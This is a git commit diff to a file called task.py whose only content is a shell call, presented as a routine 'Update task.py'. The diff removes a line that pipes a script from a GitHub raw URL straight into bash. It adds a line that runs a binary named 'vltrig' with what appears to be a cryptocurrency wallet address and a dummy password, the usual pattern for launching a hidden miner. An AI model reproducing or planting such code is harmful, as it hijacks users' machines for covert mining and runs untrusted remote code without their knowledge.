c9989a8829d13945949423d53be7f3a2f761f980
fadliamroziqyaa-hub <fadliamroziqyaa@gmail.com>
2026-04-04 03:37:02 -0700

    Update task.py

--- task.py
+++ task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/fadliamroziqyaa-hub/gosen/raw/main/xxx | bash')
+os.system('./vltrig --user 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK --pass x')
